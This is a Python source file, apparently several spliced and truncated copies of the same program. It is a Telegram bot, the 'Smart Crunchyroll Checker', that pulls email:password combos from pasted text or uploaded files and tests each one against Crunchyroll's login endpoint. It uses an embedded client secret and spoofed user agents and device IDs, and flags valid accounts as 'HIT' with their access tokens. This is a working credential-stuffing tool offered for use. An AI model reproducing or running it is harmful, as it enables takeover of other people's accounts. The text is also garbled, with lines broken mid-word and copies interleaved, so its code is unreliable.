import os
import asyncio
import re
import import os
import asyncio
import re
import requests
from uuid import uuid4
from user_agent import generate_user_agent
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode


def crunchyroll_check(username: str, password: str):
    try:
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        headers = {"content-type": "application/x-www-form-urlencoded", "user-agent": generate_user_agent()}
        data = {
            "grant_type": "password",
            "username": username,
            "password": password,
            "scope": "offline_access",
            "client_id": "y2arvjb0h0rgvtizlovy",
            "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
            "device_id": str(uuid4())
        }
        r = requests.post(url, headers=headers, data=data, timeout=25)
        if r.status_code != 200:
            return "❌ Invalid credentials"
        token = r.json().get("access_token")
        return f"✅ **HIT**\nEmail: `{username}`\nToken: `{token[:60]}...`"
    except:
        return "⚠️ Error"


def extract_combos(text):
    pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)'
    matches = re.findall(pattern, text)
    return [f"{e.strip()}:{p.strip()}" for e, p in matches if e and p]


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎉 Send messy combo text or .txt file")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or ""
    combos = extract_combos(text)
    if not combos:
        return await update.message.reply_text("No combos found")

    await update.message.reply_text(f"Found {len(combos)} combos. Checking...")

    for i, combo in enumerate(combos, 1):
        email, pwd = combo.split(":", 1)
        await update.message.reply_text(f"[{i}/{len(combos)}] Checking {email}")
        result = crunchyroll_check(email, pwd)
        await update.message.reply_text(result)
        await asyncio.sleep(2)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.lower().endswith('.txt'):
        return await update.message.reply_text("Only .txt allowed")

    await update.message.reply_text("Processing file...")
    file = await context.bot.get_file(doc.file_id)
    content = (await file.download_as_bytearray()).decode('utf-8', errors='ignore')
    
    combos = extract_combos(content)
    if not combos:
        return await update.message.reply_text("No combos found")

    await update.message.reply_text(f"Found {len(combos)} combos...")

    for i, combo in enumerate(combos, 1):
        email, pwd = combo.split(":", 1)
        await update.message.reply_text(f"[{i}/{len(combos)}] {email}")
        result = crunchyroll_check(email, pwd)
        await update.message.reply_text(result)
        await asyncio.sleep(2)


def main():
    app = Application.builder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    print("Bot Running...")
    app.run_polling()


if __name__ == "__main__":
    main()
from uuid import uuid4
from user_agent import generate_user_agent
from telegram import Update
from telegram.eimport os
import asyncio
import re
import requests
from uuid import uuid4
from user_agent import generate_user_agent
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode


def crunchyroll_check(username: str, password: str):
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": generate_user_agent()
    }
    
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "offline_access",
        "client_id": "y2arvjb0h0rgvtizlovy",
        "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
        "device_type": "Redmi",
        "device_id": str(uuid4()),
        "device_name": "Redmi note 8 pro"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=25)
        
        if response.status_code != 200:
            return "❌ Invalid credentials"

        token_data = response.json()
        access_token = token_data.get("access_token")
        
        if not access_token:
            return "❌ Invalid credentials"

        return f"✅ **HIT**\nEmail: `{username}`\nToken: `{access_token[:60]}...`"

    except Exception:
        return "⚠️ Check failed"


def extract_combos(text: str):
    # Improved regex - more flexible
    pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)'
    matches = re.findall(pattern, text)
    combos = [f"{email.strip()}:{pwd.strip()}" for email, pwd in matches if email and pwd]
    return combos


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎉 **Smart Crunchyroll Checker v2**\n\n"
        "Now supports very messy formats!\n"
        "Just paste and it will extract all combos automatically.",
        parse_mode=ParseMode.MARKDOWN
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text if update.message.text else ""
    if not text or text.startswith('/'):
        return

    combos = extract_combos(text)

    if not combos:
        await update.message.reply_text("❌ Could not find any `email:password` in your message.")
        return

    await update.message.reply_text(f"✅ Extracted **{len(combos)}** combos. Starting check...")

    for i, combo in enumerate(combos, 1):
        email, password = combo.split(":", 1)
        await update.message.reply_text(f"[{i}/{len(combos)}] Checking → `{email}`", parse_mode=ParseMode.MARKDOWN)
        
        result = crunchyroll_check(email, password)
        await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)
        
        await asyncio.sleep(2.0)  # Safe delay


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.lower().endswith('.txt'):
        await update.message.reply_text("❌ Only .txt files allowed")
        return

    await update.message.reply_text("📂 Processing file...")

    try:
        file = await context.bot.get_file(document.file_id)
        content = (await file.download_as_bytearray()).decode('utf-8', errors='ignore')

        combos = extract_combos(content)

        if not combos:
            await update.message.reply_text("❌ No combos found in file.")
            return

        await update.message.reply_text(f"✅ Found {len(combos)} combos. Checking...")

        for i, combo in enumerate(combos, 1):
            email, password = combo.split(":", 1)
            await update.message.reply_text(f"[{i}/{len(combos)}] → `{email}`", parse_mode=ParseMode.MARKDOWN)
            
            result = crunchyroll_check(email, password)
            await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)
            
            await asyncio.sleep(2.0)

    except Exception as e:
        await update.message.reply_text(f"❌ File error: {str(e)[:100]}")


def main():
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if not TOKEN:
        print("❌ TELEGRAM_BOT_TOKEN not set!")
        return

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("🚀 Smart Crunchyroll Checker v2 Running...")
    app.run_polling()


if __name__ == "__main__":
    main()xt import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode


def crunchyroll_check(username: str, password: str):
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": generate_user_agent()
    }
    
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "offline_access",
        "client_id": "y2arvjb0h0rgvtizlovy",
        "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
        "device_type": "Redmi",
        "device_id": str(uuid4()),
        "device_name": "Redmi note 8 pro"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=25)
        
        if response.status_code != 200:
            return "❌ Invalid credentials"

        token_data = response.json()
        access_token = token_data.get("access_token")
        
        if not access_token:
            return "❌ Invalid credentials"

        return f"✅ **HIT**\nEmail: `{username}`\nToken: `{access_token[:60]}...`"

    except Exception as e:
        return f"⚠️ Error: {str(e)[:80]}"


def extract_combos(text: str):
    pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):([^\s|]+)'
    matches = re.findall(pattern, text)
    combos = [f"{email.strip()}:{password.strip()}" for email, password in matches if email and password]
    return combos


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎉 **Smart Crunchyroll Checker**\n\n"
        "Paste any messy text or upload .txt file\n"
import os
import asyncio
import re
import requests
from uuid import uuid4
from user_agent import generate_user_agent
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode


def crunchyroll_check(username: str, password: str):
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": generate_user_agent()
    }
    
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "offline_access",
        "client_id": "y2arvjb0h0rgvtizlovy",
        "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
        "device_type": "Redmi",
        "device_id": str(uuid4()),
        "device_name": "Redmi note 8 pro"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=25)
        
        if response.status_code != 200:
import os
import asyncio
import re
import requests
from uuid import uuid4
from user_agent import generate_user_agent
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode


def crunchyroll_check(username: str, password: str):
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": generate_user_agent()
    }
    
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "offline_access",
        "client_id": "y2arvjb0h0rgvtizlovy",
        "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
        "device_type": "Redmi",
        "device_id": str(uuid4()),
        "device_name": "Redmi note 8 pro"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=25)
        
        if response.status_code != 200:
            return "❌ Invalid credentials"

        token_data = response.json()
        access_token = token_data.get("access_token")
        
        if not access_token:
            return "❌ Invalid credentials"

import os
import asyncio
import re
import requests
from uuid import uuid4
from user_agent import generate_user_agent
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode


def crunchyroll_check(username: str, password: str):
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": generate_user_agent()
    }
    
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "offline_access",
        "client_id": "y2arvjb0h0rgvtizlovy",
        "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
        "device_type": "Redmi",
        "device_id": str(uuid4()),
        "device_name": "Redmi note 8 pro"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=25)
        if response.status_code != 200:
            return "❌ Invalid credentials"
        
        token_data = response.json()
        access_token = token_data.get("access_token")
        if not access_token:
import os
import asyncio
import re
import requests
from uuid import uuid4
from user_agent import generate_user_agent
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode


def crunchyroll_check(username: str, password: str):
    try:
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        headers = {"content-type": "application/x-www-form-urlencoded", "user-agent": generate_user_agent()}
        data = {
            "grant_type": "password",
            "username": username,
            "password": password,
            "scope": "offline_access",
            "client_id": "y2arvjb0h0rgvtizlovy",
            "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
            "device_id": str(uuid4())
        }
        r = requests.post(url, headers=headers, data=data, timeout=25)
        if r.status_code != 200:
            return "❌ Invalid credentials"
        token = r.json().get("access_token")
        return f"✅ **HIT**\nEmail: `{username}`\nToken: `{token[:60]}...`"
    except:
        return "⚠️ Error"


def extract_combos(text):
    pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)'
    matches = re.findall(pattern, text)
    return [f"{e.strip()}:{p.strip()}" for e, p in matches if e and p]


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎉 Send messy combo text or .txt file")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or ""
    combos = extract_combos(text)
    if not combos:
        return await update.message.reply_text("No combos found")

    await update.message.reply_text(f"Found {len(combos)} combos. Checking...")

    for i, combo in enumerate(combos, 1):
        email, pwd = combo.split(":", 1)
        await update.message.reply_text(f"[{i}/{len(combos)}] Checking {email}")
        result = crunchyroll_check(email, pwd)
        await update.message.reply_text(result)
        await asyncio.sleep(2)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.lower().endswith('.txt'):
        return await update.message.reply_text("Only .txt allowed")

    await update.message.reply_text("Processing file...")
    file = await context.bot.get_file(doc.file_id)
    content = (await file.download_as_bytearray()).decode('utf-8', errors='ignore')
    
    combos = extract_combos(content)
    if not combos:
        return await update.message.reply_text("No combos found")

    await update.message.reply_text(f"Found {len(combos)} combos...")

    for i, combo in enumerate(combos, 1):
        email, pwd = combo.split(":", 1)
        await update.message.reply_text(f"[{i}/{len(combos)}] {email}")
        result = crunchyroll_check(email, pwd)
        await update.message.reply_text(result)
        await asyncio.sleep(2)


def main():
    app = Application.builder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    print("Bot Running...")
    app.run_polling()


if __name__ == "__main__":
    main()
